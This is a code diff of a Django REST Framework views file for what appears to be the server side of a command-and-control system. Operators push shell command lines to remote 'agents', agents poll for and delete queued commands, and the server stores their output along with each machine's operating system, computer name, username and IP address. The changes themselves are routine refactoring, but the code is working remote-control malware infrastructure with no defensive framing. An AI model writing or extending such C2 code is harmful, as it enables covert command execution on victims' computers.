@@ -3,11 +3,11 @@ from rest_framework.decorators import api_view
 from rest_framework.response import Response
 
 from django.http import Http404
+from django.utils import timezone
 
-from .utils import Pipeline
+from .utils import get_client_ip
 from .models import Agent, Session, Agent_session
 
-from datetime import datetime
 import cgi
 
 
@@ -25,7 +25,7 @@ def push_command(request, agent_identifier):
 
     agent = Agent.objects.get(identifier=agent_identifier)
     agent.push_cmd(request.form['cmdline'])
-    return ''
+    return Response(data='')
 
 
 @api_view(['POST'])
@@ -43,15 +43,16 @@ def get_command(request, agent_identifier):
     else:
         agent = Agent.objects.get(identifier=agent_identifier)
 
-    info = request.json
+    info = request.data.dict()
 
     # initialise or update basic information about the agent
     agent.operating_system = info['operating_system']
     agent.computer_name = info['computer_name']
     agent.username = info['username']
 
-    agent.last_online = datetime.now()
-    agent.remote_ip = request.remote_addr
+    agent.last_online = timezone.now()
+    agent.remote_ip = get_client_ip(request)
+    agent.protocol = 'http'
     agent.save()
 
     # get commands to run
@@ -60,7 +61,7 @@ def get_command(request, agent_identifier):
     if commands:
         cmdline = commands[0].cmdline
         commands[0].delete()
-    return cmdline
+    return Response(data=cmdline)
 
 
 @api_view(['POST'])
@@ -78,8 +79,8 @@ def output_command(request, agent_identifier):
     else:
         agent = Agent.objects.get(identifier=agent_identifier)
 
-    info = request.json
+    info = request.data.dict()
     output = info["output"]
     agent.output += cgi.escape(output)
     agent.save()
-    return ''
+    return Response(data='')
